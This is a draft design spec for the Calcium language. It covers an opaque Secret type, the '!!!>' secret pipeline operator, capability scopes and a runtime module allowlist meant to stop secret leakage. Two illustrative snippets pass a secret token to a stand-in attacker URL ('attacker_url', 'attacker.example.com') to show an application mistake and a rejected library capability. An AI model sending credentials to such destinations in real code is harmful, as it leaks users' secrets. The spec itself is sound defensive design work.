# Secret Values and Secret-Authorized Pipelines

Status: Draft
Owners: calcium-lang maintainers
Related:

- `calcium-spec.md` (language semantics)
- `specs/module-import-spec.md` (module resolution)
- `specs/module-registry-spec.md` (registry module identity)

## Summary

Calcium should provide a built-in, opaque `Secret` value that can wrap any
Calcium value. Secrets must not be printable, serializable, or passed to normal
effects. A dedicated effect pipeline operator, `!!!>`, is the only way to pass
a Secret to an effect, and it is valid only inside a capability scope. In
addition, the runtime must consult an operator-supplied module allowlist before
any Secret crosses an effect boundary.

The design has two independent gates:

1. **Source-level intent** — `Secret.with(cap) { ... }` and `!!!>`.
2. **Run-time authority** — the currently executing module must be explicitly
   allowed to perform Secret writes by the runtime policy.

Both gates must pass. Source code cannot grant itself runtime authority.

End-to-end shape:

```calcium
// main.ca (entry module)
api_cap = Secret.capability(http.post_secret, {
    url: "https://api.example.com/upload"
});

Secret.with(api_cap) {
    token !!!> http.post_secret(url, api_cap, "text/plain", {});
}
```

```bash
# Runtime authority is separate from source code.
calcium run --allow-secret-write=entry main.ca
```

## Goals

- Prevent accidental leakage of secrets through logs, string conversion,
  interpolation, JSON/TOML serialization, database parameters, HTTP, child
  processes, and error messages.
- Make every Secret-to-effect boundary visible and easy to audit in source.
- Allow application code to delegate a Secret to a trusted library without
  revealing the raw value to that library.
- Allow the operator/embedder to decide at run time which modules may write
  secrets to effects.
- Preserve Calcium's existing effect pipeline model (`|>`, `!>`, `!?`).
- Fail closed by default.

Intended developer experience:

```calcium
token = Secret.wrap(env_token);

token !> io.println;       // rejected: use !!!> and a capability
to_string(token);          // "<secret>"

Secret.with(api_cap) {
    token !!!> http.post_secret(url, api_cap, "text/plain", {});  // explicit, auditable boundary
}
```

## Non-goals

- Protecting against all malicious code or side channels (timing, memory
  inspection, process compromise).
- Guaranteed memory zeroization. Go's garbage collector makes hard guarantees
  impractical.
- Replacing OS-level secret storage or a dedicated secrets manager.
- Preventing a trusted sink from sending a secret to an attacker-controlled
  destination. Capabilities limit the destination/operation; they do not
  validate the application's business logic.

For example, this remains an application-level mistake if the application
creates such a capability:

```calcium
bad_cap = Secret.capability(http.post_secret, {url: attacker_url});
Secret.with(bad_cap) {
    token !!!> http.post_secret(attacker_url, bad_cap, "text/plain", {});
}
```

The runtime can enforce that the sink and destination match the capability, but
it cannot know that the destination is malicious.

## `Secret` value

`Secret` is a built-in opaque value type. It can wrap any Calcium value, not
only strings.

```calcium
api_key: Secret = Secret.wrap("token-123");
credentials: Secret = Secret.wrap({
    user: "alice",
    password: "hunter2"
});
```

`Secret` is not an algebraic data type. It has no user-accessible constructor
pattern and no field access. Pattern matching on `Secret` is a compile error.

### Safe operations

```calcium
Secret.wrap(value)        // value -> Secret
Secret.map(secret, fn)    // apply a pure function, result stays Secret
```

```calcium
token = Secret.wrap("  token-123  ");
normalized = Secret.map(token, s => string.trim(s));

credentials = Secret.wrap({
    user: "alice",
    password: "hunter2"
});
```

`Secret.map` is the supported way to transform a secret value. The callback is
pure, and the result is wrapped again. A Secret cannot be converted back to a
plain value by ordinary language operations.

An explicit declassification operation may be added later:

```calcium
Secret.declassify(secret) // future, effectful, runtime-policy controlled
```

No `reveal` operation is included in the initial design.

### Redaction and forbidden operations

The runtime must redact Secrets everywhere a value can be rendered:

- `to_string(secret)` returns `"<secret>"`.
- Direct `io.print` / `io.println` of a Secret is rejected as an ordinary
  effect. Use `io.println(to_string(secret))` for redacted logging.
- String interpolation renders `"<secret>"`, never the underlying value.
- Arrays/hashes containing Secrets render recursively redacted.
- REPL output and runtime error messages never include the underlying value.
- `json.stringify`, `toml.stringify`, and `dbi.quote` reject Secrets or emit a
  redacted placeholder only when an explicit redacted mode is requested.

The following operations are rejected:

- `len(secret)` and ordinary string operations (`string.upper`, `concat`,
  `substring`, etc.) are rejected, statically where detectable and otherwise at
  runtime.
- Direct equality (`secret == other`) compares Secret identity, never the
  underlying payload. There is no `Secret.equal` operation.
- Casting/conversion through `types.to_string` or any other generic conversion.

```calcium
token = Secret.wrap("token-123");

to_string(token);              // "<secret>"
io.println(to_string(token));  // <secret>
io.println(token);             // compile error: Secret passed to an effect
"token is ${token}";           // "token is <secret>"

[token, "public"] |> to_string;
// [<secret>, public] (recursive redaction)

{authorization: token} |> to_string;
// {authorization: <secret>} (recursive redaction)

json.stringify(token);         // rejected: Secret passed to an effect
toml.stringify(token);         // rejected: Secret passed to an effect
dbi.quote(token);              // rejected: Secret passed to an effect

token[0];                      // runtime error: indexing a Secret is rejected
len(token);                    // failure: len is not supported for Secret
string.upper(token);           // rejected: Secret passed to an effect
token == Secret.wrap("x");     // false: identity comparison, payload never inspected
```

## Secret-authorized effect pipeline: `!!!>`

`!!!>` is a distinct operator from `!>`.

```text
|>    pure pipeline
!>    effect pipeline
!!!>  effect pipeline authorized to pass Secrets
!?    error handling
```

Example:

```calcium
Secret.with(api_cap) {
    Secret.map(api_key, s => string.trim(s))
      !!!> http.post_secret(url, api_cap, "text/plain", {});
}
```

Rejected forms:

```calcium
api_key !> io.println;        // compile error: normal effect pipeline

api_key !!!> http.post_secret(url, api_cap, "text/plain", {});
// compile error: !!!> requires an active Secret.with scope
```

Rules:

- `!!!>` shares `!>`'s precedence, but it deliberately relaxes two `!>` rules:
  - It may appear outside `func!`, including at the entry module's top level.
  - It does not require a terminating `!?`; the call result remains a
    `success`/`failure` value that the caller handles.
  The carve-out is intentional. Authorization for `!!!>` comes from the
  enclosing `Secret.with(cap)` scope and the runtime allowlist, not from an
  enclosing effect function or a trailing error handler.
- The right-hand side of `!!!>` must be an effect function (`func!`). A pure
  function is a compile error; use `|>` for pure stages.
- `!!!>` is a compile error outside any `Secret.with(cap)` block.
- The sink must be a named function. The compiler does not verify statically
  that a capability covers the sink; that check happens at runtime (see
  "Capability scope").
- A Secret passed to `!>` is a compile error when statically detectable and a
  runtime error otherwise.
- The capability must authorize the specific effect and, where applicable, its
  destination/operation.
- `!!!>` does not authorize arbitrary effects. Each pipeline stage is checked
  independently.
- `!!!>` does not bypass the runtime module allowlist.
- Pure stages (`|>`) preserve the Secret wrapper.

Tokenization and formatting:

- The lexer recognizes `!!!>` as one token (`SECRET_PIPE`) using longest-match
  rules.
- It has the same precedence as `!>`.
- The formatter always emits `!!!>` with single spaces around it.
- `!!!x` remains three logical-not tokens; only `!!!>` is the pipeline token.

## Capabilities and `Secret.with`

A capability is an opaque value created by the application/entry environment.
It describes which effect(s) and destinations may receive Secrets.

```calcium
// Entry module only.
api_cap = Secret.capability(http.post_secret, {
    url: "https://api.example.com/upload"
});

Secret.with(api_cap) {
    token !!!> http.post_secret(url, api_cap, "text/plain", {});
}
```

Capabilities are values and can be passed to libraries:

```calcium
// Library
func! upload(value: Secret, cap, url) =
    Secret.with(cap) {
        value !!!> http.post_secret(url, cap, "text/plain", {});
    };

// Application
upload(token, api_cap, url);
```

The library can carry the Secret to an authorized sink but cannot inspect it.

```calcium
// Library receives only an opaque Secret and an opaque capability.
func! upload(value: Secret, cap, url) = Secret.with(cap) {
    value !!!> http.post_secret(url, cap, "text/plain", {})
};

// Library cannot print or serialize the raw value.
func! debug(value: Secret) = io.println(to_string(value));
// prints "<secret>", never the underlying value
```

### Capability creation

- Only the entry module may create capabilities.
- Imported modules cannot create capabilities, even if they declare a function
  with the same name.
- Capability creation is a built-in operation whose authority comes from the
  entry environment, not from ordinary library code.
- A capability is bound to a sink identity and optional scope (destination,
  operation, account, etc.).
- Capabilities are not forgeable by constructing plain hashes/strings with the
  same shape.

Entry module:

```calcium
// entry module: allowed
api_cap = Secret.capability(http.post_secret, {
    url: "https://api.example.com/upload"
});
```

Imported module:

```calcium
// imported module: compile error
lib_cap = Secret.capability(http.post_secret, {
    url: "https://attacker.example.com"
});
```

### Capability scope

`Secret.with(cap) { ... }` evaluates the block with `cap` active.

- The block is an expression; its value is the value of the final expression.
- `!!!>` is a compile error outside any `Secret.with` block.
- The compiler checks only the lexical scope of `Secret.with` and that the sink
  is a named function. It does not verify that the capability covers the sink:
  capability values are constructed at run time, and a borrowed capability is
  an opaque parameter the compiler cannot inspect.
- At the `!!!>` boundary the runtime verifies that an active capability names
  the sink and that the module is allowlisted; the trusted sink then verifies
  the capability's scope fields (destination/operation) before unwrapping.

```calcium
result = Secret.with(api_cap) {
    token !!!> http.post_secret(url, api_cap, "text/plain", {})
};

// Outside the scope, !!!> is invalid.
token !!!> http.post_secret(url, api_cap, "text/plain", {});  // compile error
```

The block is an expression, so it can be composed:

```calcium
status = Secret.with(api_cap) {
    Secret.map(token, s => string.trim(s))
      !!!> http.post_secret(url, api_cap, "text/plain", {})
};
```

## Runtime module allowlist

Source-level `!!!>` expresses intent. It is not sufficient authority because a
library can write `!!!>` itself. The runtime therefore requires an independent
allowlist of modules permitted to write Secrets to effects.

```bash
calcium run \
  --allow-secret-write=entry \
  --allow-secret-write=./lib/auth.ca \
  --allow-secret-write=core.http \
  --allow-secret-write=ytnobody/http \
  main.ca
```

The allowlist can also be supplied through the `CALCIUM_SECRET_WRITE_ALLOW`
environment variable (comma-separated) or an embedding API. It must never be
mutable from Calcium source code.

### Policy evaluation

At a Secret-to-effect boundary, all of the following must hold:

1. The call site is a `!!!>` stage.
2. An active capability covers the effect and scope.
3. The canonical module ID of the currently executing function is allowed by
   the runtime policy.
4. The effect is a trusted sink capable of accepting a Secret.

If any check fails, the VM raises a runtime error.

```calcium
// in ./lib/auth.ca (allowlisted)
Secret.with(api_cap) {
    token !!!> http.post_secret(url, api_cap, "text/plain", {});  // OK
}
```

```calcium
// in ./evil.lib (not allowlisted)
Secret.with(api_cap) {
    token !!!> http.post_secret(url, api_cap, "text/plain", {});
    // runtime error: module is not allowed to write secrets
}
```

### Module identity

The allowlist must use canonical module identities, not user-controlled
namespace strings. The current implementation uses the following IDs:

- Entry module: the literal token `entry`. The entry file's path is not used as
  its runtime ID.
- Standard library: fixed IDs such as `core.http`.
- Local modules: the resolved absolute file path.
- Registry modules: `author/name`, for example `ytnobody/http`. The version is
  resolved at install time from the lockfile but is not part of the runtime ID
  in the first version.
- GitHub URL modules: `github.com/author/repo`.

Allowlist entries starting with `./` or `../` are resolved relative to the
entry file's directory and must match the module's cleaned absolute path
exactly.

Canonical IDs used by the policy:

```text
entry
./lib/auth.ca      # resolves to <entry dir>/lib/auth.ca
core.http
ytnobody/http
github.com/ytnobody/http
```

A module must not be able to obtain authority merely by declaring:

```calcium
namespace ytnobody.http;
```

The namespace above does not match `ytnobody/http` in the allowlist; the policy
checks the resolved module identity, not the declared namespace. Because the
first version's registry ID does not include a version, allowlisting
`ytnobody/http` trusts every installed version of that module; version-scoped
allowlist entries are future work.

### Default policy

The default is deny. The entry module is not implicitly allowed; deployments
must opt in explicitly. For development ergonomics, the CLI may offer an
explicit `--allow-secret-write=entry` switch.

Allowlist entries are module-granular in the first version. Future versions may
extend the policy to `(module, sink, destination)` tuples. A module with no
recorded identity (for example, legacy bytecode) is treated as `<unknown>` and
fails closed.

```bash
# Default: Secret writes are denied, including in the entry module.
calcium run main.ca

# Explicitly allow the entry module only.
calcium run --allow-secret-write=entry main.ca

# Allow a specific imported module as well.
calcium run --allow-secret-write=entry --allow-secret-write=./lib/auth.ca main.ca
```

## Trusted sinks

A trusted sink is implemented by the runtime/stdlib, not by ordinary Calcium
code. It is the only component that may unwrap a Secret.

Implemented sinks:

```calcium
// core.http
http.post_secret(secret, url, capability, content_type, headers)

// core.os
os.proc_write_secret(secret, handle, capability)
```

A database secret sink is planned but is not part of the current
implementation.

Pure Calcium libraries cannot declare themselves as trusted sinks. They can
accept a Secret and a capability and pass them to a trusted sink.

```calcium
// stdlib/runtime trusted sink wrappers (conceptual)
func! post_secret(secret, url, capability, content_type, headers) =
    __http_post_secret(url, secret, capability, content_type, headers);

func! proc_write_secret(secret, handle, capability) =
    __proc_write_secret(handle, secret, capability);

// Application-level library: forwards, never unwraps
func! upload(secret: Secret, cap, url) =
    Secret.with(cap) {
        secret !!!> http.post_secret(url, cap, "text/plain", {})
    };
```

```calcium
// Invalid: pure Calcium code cannot become a trusted sink.
func! fake_sink(secret: Secret) = secret;  // cannot unwrap or bypass policy
```

## Container semantics

Secrets may be nested in arrays, hashes, tuples, and ADTs. Any operation that
serializes or renders a container must recursively redact Secret leaves.

Passing a container that contains a Secret to a normal effect is subject to the
same checks as passing the Secret directly. The runtime must scan arguments
recursively (or use a taint marker propagated by containers).

```calcium
payload = {
    authorization: Secret.wrap(token),
    count: 1
};

to_string(payload);
// "{authorization: <secret>, count: 1}"

http.post(url, payload);  // compile/runtime error: contains a Secret

Secret.with(api_cap) {
    payload !!!> http.post_secret(url, api_cap, "text/plain", {});  // allowed if cap/policy match
}
```

```calcium
nested = [Secret.wrap(token), {password: Secret.wrap(pw)}];

to_string(nested);        // "[<secret>, {password: <secret>}]"
json.stringify(nested);   // rejected: contains a Secret
```

## Error handling

Compile-time errors:

- Secret passed to `!>` when statically detectable.
- `!!!>` outside a `Secret.with` scope.
- `!!!>` whose right-hand side is a pure function.
- `!!!>` whose sink is not a named function.
- Secret pattern matching.
- Secret used in a forbidden string operation.

Runtime errors:

- `!!!>` used with a missing/expired/incorrect capability.
- `!!!>` whose capability does not cover the sink.
- Secret field/index access.
- Secret passed to an unapproved effect through dynamic/untyped code.
- Current module not present in the runtime allowlist.
- Trusted sink called without a valid capability.

Error messages must never contain the Secret's underlying value. They may
identify the module, effect, and capability.

```calcium
// Compile-time
token !> io.println;
// error: Secret cannot be passed to '!>'; use Secret.with(cap) { ... !!!> ... }

token !!!> http.post_secret(url, api_cap, "text/plain", {});
// error: '!!!>' requires an active Secret.with(cap) scope

match token
    Secret(v) => v
// error: Secret is opaque and cannot be pattern-matched
```

```calcium
// Runtime
Secret.with(api_cap) {
    token !!!> http.post_secret(url, api_cap, "text/plain", {});
}
// error: module '<canonical module id>' is not allowed to write secrets
```

## Gradual typing backstop

Calcium allows untyped code and `Any`. Compile-time checks are therefore best
effort. The VM must enforce Secret safety at effect boundaries regardless of
static types.

```calcium
func! dynamic_leak(x) = io.println(x);

hidden = make_hidden_value(token);  // statically Any
dynamic_leak(hidden);
// runtime error: Secret reached an unapproved effect boundary
```

Even if the compiler cannot prove that `hidden` is a Secret, the runtime value
still carries the Secret wrapper and the effect boundary rejects it.

## Compatibility

- `!!!>` was not previously a valid operator, so adding it is backward
  compatible.
- `Secret` becomes a reserved built-in type name.
- Existing values are unaffected; wrapping is explicit.
- Existing effect pipelines continue to work for non-Secret values.
- JSON/TOML modules are updated to reject or redact Secret values by default.
  Database integration remains future work.

```calcium
// Existing non-secret code keeps working unchanged.
value !> io.println;

// Secret code uses the new operator and an explicit capability scope.
Secret.with(api_cap) {
    secret_value !!!> http.post_secret(url, api_cap, "text/plain", {});
}
```

## Test plan

Compile-time:

- `secret !> io.println;` fails.
- `secret !!!> io.println;` outside `Secret.with` fails.
- `Secret` pattern matching fails.
- `Secret` serialization (JSON/TOML) fails.
- `!!!x` still parses as logical-not tokens.

Runtime:

- Redaction in `to_string`, interpolation, arrays, hashes, and errors; direct effect printing is rejected.
- A capability that does not cover the sink is rejected.

Representative cases:

```calcium
// Compile-time rejection
token !> io.println;

// Runtime rejection
Secret.with(api_cap) {
    token !!!> http.post_secret(url, api_cap, "text/plain", {});
}  // when the module is not in the runtime allowlist

// Authorized path
Secret.with(api_cap) {
    token !!!> http.post_secret(url, api_cap, "text/plain", {});
}  // when the module is allowlisted and the capability matches

// Redaction
to_string(token);        // "<secret>"
json.stringify(token);   // rejected
```

- Authorized `Secret.with(cap) { secret !!!> sink; }` succeeds when module is
  allowed.
- Same code fails when module is not in the runtime allowlist.
- A library cannot create a capability.
- A library can forward a Secret to a trusted sink with a delegated capability.
- Dynamic/untyped bypass attempts fail at the effect boundary.
- Nested Secrets in containers are detected.
- JSON/TOML/DB rejection paths.

## Implementation phases

1. `Secret` value, redaction, `Secret.wrap`, `Secret.map`.
2. `!!!>` token/parser/formatter and static Secret-in-`!>` checks.
3. `Secret.with` capability scopes and capability values.
4. Trusted sink primitives.
5. Runtime module allowlist and module identity propagation.
6. JSON/TOML/DB integration and end-to-end tests.

Status: phases 1–5 are implemented, including the `http.post_secret` and
`os.proc_write_secret` trusted sinks. Phase 6 is partial: JSON/TOML reject
Secrets, but there is no database secret sink yet. Security-sensitive behavior
should still be reviewed before phases 1–5 ship; without the runtime allowlist
and capability checks they are only an accidental-leak prevention layer.

Phase 1–2 target:

```calcium
token = Secret.wrap("token-123");
to_string(token);  // "<secret>"

token !> io.println;  // rejected
```

Phase 3–5 target:

```calcium
Secret.with(api_cap) {
    token !!!> http.post_secret(url, api_cap, "text/plain", {});
}
```

with the runtime module allowlist deciding whether the currently executing
module may perform the write.
